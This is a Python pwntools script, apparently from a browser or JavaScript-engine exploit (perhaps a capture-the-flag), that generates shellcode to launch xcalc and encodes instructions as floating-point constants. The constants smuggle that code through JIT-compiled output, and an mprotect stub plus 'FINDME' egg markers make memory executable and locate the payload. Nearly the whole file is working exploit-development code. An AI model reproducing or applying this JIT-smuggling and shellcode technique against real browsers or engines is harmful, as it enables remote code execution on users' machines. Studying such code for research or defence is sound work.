from pwn import *
import struct

context(arch='amd64', os='linux')

cmd = '/usr/bin/xcalc'
shellcode = asm(shellcraft.execve(cmd, 0, ["DISPLAY=:0"]))
# p = run_shellcode(shellcode)
# p.interactive()

# var shelcode = [0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, ...];
print("var shellcode = [")
row_length = 16
for i in range(0, len(shellcode), row_length):
    print("    ", end='')
    for j in range(row_length):
        if i+j < len(shellcode):
            print(f"0x{shellcode[i+j]:02x}, ", end='')
    print("")
print("];")

# Primary shellcode
'''
   0xeba2e67eb8e:       movabs r11,0x2121454d444e4946
   0xeba2e67eb98:       mov    QWORD PTR [rbp-0x50],r11
   0xeba2e67eb9c:       movabs r11,0x48cccccccccccccc
   0xeba2e67eba6:       mov    QWORD PTR [rbp-0x58],r11
   0xeba2e67ebaa:       movabs r11,0x90909005eb087a8b
   tl;dr, we control 8 out of every 14 bytes
'''

DEBUG = False
shellcode  = b"FINDME!!"
shellcode += asm(f"""
inst0:
    {"int3" if DEBUG else "nop"}
    mov rdi, [rdx+8]
    jmp $+0x09
    nop

inst1:
    mov esi, 0x1000
    jmp $+0x09
    nop

inst2:
    mov edx, 7
    jmp $+0x09
    nop

inst3:
    mov eax, SYS_mprotect
    syscall
    ret
""")

print(disasm(shellcode[8:]))

# pad shellcode to 8 byte alignment
shellcode += b"\x90"*(8 - len(shellcode) % 8)

print(shellcode)
for i in range(0, len(shellcode), 8):
    val = struct.unpack("<d", shellcode[i:i+8])[0]
    idx = i // 8
    print(f"    const lmao{idx} = {val};")


DEBUG = False
shellcode  = b"FINDME1!"
shellcode += b"FINDME2!"
shellcode += asm(f"""
inst0:
    {"int3" if DEBUG else "nop"}
    mov rdi, [rdx+8]
    mov esi, 0x1000
    mov edx, 7
    mov eax, SYS_mprotect
    syscall
    ret
""")
shellcode += b"\x90"*(8 - len(shellcode) % 8)
print("const mprotector = (x) => [", end='')
for i in range(0, len(shellcode), 8):
    val = struct.unpack("<d", shellcode[i:i+8])[0]
    idx = i // 8
    print(f"{val}, ", end='')
print("];")
print("const egg1 = mprotector(0)[0];")
print("const egg2 = mprotector(0)[2];")
